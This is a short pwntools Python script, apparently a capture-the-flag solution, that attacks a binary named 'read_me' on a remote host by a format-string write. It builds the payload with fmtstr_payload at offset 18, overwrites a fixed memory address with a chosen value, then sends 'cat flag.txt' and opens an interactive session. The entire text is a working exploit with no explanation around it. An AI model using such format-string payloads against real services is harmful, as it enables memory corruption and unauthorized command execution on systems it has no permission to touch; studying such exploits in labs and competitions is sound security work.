from pwn import *
elf = ELF('./read_me')
#libc = ELF('./libc.so.6')
p = remote('115.127.114.85',8011)
print(hex(next(elf.search('brocode'))))
writes = {0x804c030: 0x4adf070f}

#p= elf.process()
#context.terminal = ['tmux', 'splitw', '-h'] 
context.log_level = 'debug'
p.recvuntil('Enter name: ')
payload = fmtstr_payload(18, writes)
p.send(payload)
p.send('cat flag.txt')
p.send('\n')
p.interactive()
